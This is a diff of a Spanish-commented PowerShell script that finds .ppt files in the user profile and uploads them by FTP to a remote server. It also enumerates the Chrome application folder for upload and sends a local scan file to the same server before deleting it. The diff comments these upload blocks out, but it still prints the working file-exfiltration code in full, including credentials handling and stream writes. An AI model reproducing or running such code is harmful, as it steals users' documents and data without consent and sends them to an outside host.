@@ -17,24 +17,43 @@ $archivosPPT = Get-ChildItem -Path $perfilUsuario -Filter $patronBusqueda -Recur
 # Mostrar la lista de archivos encontrados
 if ($archivosPPT.Count -gt 0) {
     Write-Host "Archivos .ppt encontrados en $perfilUsuario"
-    foreach ($archivo in $archivosPPT) {
-        Write-Host $archivo.FullName
-	$archivoRemoto = "/" + $archivo.Name
-	$ftp = [System.Net.WebRequest]::Create("ftp://$ftpServer$archivoRemoto")
-	$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
-	$ftp.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
-	$contenidoArchivo = Get-Content -Path $archivo.FullName -Raw
-	$bytesArchivo = [System.Text.Encoding]::UTF8.GetBytes($contenidoArchivo)
-
-	$stream = $ftp.GetRequestStream()
-	$stream.Write($bytesArchivo, 0, $bytesArchivo.Length)
-	$stream.Close()
+#    foreach ($archivo in $archivosPPT) {
+#        Write-Host $archivo.FullName
+#	$archivoRemoto = "/" + $archivo.Name
+#	$ftp = [System.Net.WebRequest]::Create("ftp://$ftpServer$archivoRemoto")
+#	$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
+#	$ftp.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
+#	$contenidoArchivo = Get-Content -Path $archivo.FullName -Raw
+#	$bytesArchivo = [System.Text.Encoding]::UTF8.GetBytes($contenidoArchivo)
+#
+#	$stream = $ftp.GetRequestStream()
+#	$stream.Write($bytesArchivo, 0, $bytesArchivo.Length)
+#	$stream.Close()
 	
-    }
+#    }
 } else {
     Write-Host "No se encontraron archivos .ppt en $perfilUsuario."
 }
 
+$rutaDirectorioLocal = "C:\Program Files\Google\Chrome\Application"
+$archivosLocales = Get-ChildItem -Path $rutaDirectorioLocal -File -Recurse
+
+# Crear una instancia de WebClient para la transferencia FTP
+#$webClient = New-Object System.Net.WebClient
+#$webClient.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
+
+#foreach ($archivoLocal in $archivosLocales) {
+#	$archivoRemoto = "/Application/" + $archivoLocal.Name
+#	$ftp = [System.Net.WebRequest]::Create("ftp://$ftpServer$archivoRemoto")
+#	$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
+#	$ftp.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
+#	$contenidoArchivo = Get-Content -Path $archivoLocal.FullName -Raw
+#	$bytesArchivo = [System.Text.Encoding]::UTF8.GetBytes($contenidoArchivo)
+#	Write-Host $archivoRemoto
+#	$stream = $ftp.GetRequestStream()
+#	$stream.Write($bytesArchivo, 0, $bytesArchivo.Length)
+#	$stream.Close()
+#}
 $resultsDir =$perfilUsuario+"\Desktop\"
 New-Item -ItemType Directory -Force -Path $resultsDir | Out-Null
 
@@ -52,12 +71,12 @@ $tiempoEspera = 2
 Start-Sleep -Seconds $tiempoEspera
 
 # Ruta local del archivo a enviar
-$archivoLocal = $perfilUsuario+"\Desktop\prueba.txt"
-$archivoRemoto = "/scan.txt"
+#$archivoLocal = $perfilUsuario+"\Desktop\prueba.txt"
+#$archivoRemoto = "/scan.txt"
 
-$ftp = [System.Net.WebRequest]::Create("ftp://$ftpServer$archivoRemoto")
-$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
-$ftp.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
+#$ftp = [System.Net.WebRequest]::Create("ftp://$ftpServer$archivoRemoto")
+#$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
+#$ftp.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
 
 # Leer el contenido del archivo local
 $contenidoArchivo = Get-Content -Path $archivoLocal -Raw
@@ -66,9 +85,9 @@ $contenidoArchivo = Get-Content -Path $archivoLocal -Raw
 $bytesArchivo = [System.Text.Encoding]::UTF8.GetBytes($contenidoArchivo)
 
 # Subir el archivo al servidor FTP
-$stream = $ftp.GetRequestStream()
-$stream.Write($bytesArchivo, 0, $bytesArchivo.Length)
-$stream.Close()
+#$stream = $ftp.GetRequestStream()
+#$stream.Write($bytesArchivo, 0, $bytesArchivo.Length)
+#$stream.Close()
 $ruta =$perfilUsuario +"\Desktop\prueba.txt"
-Remove-Item  $ruta
+#Remove-Item  $ruta
 
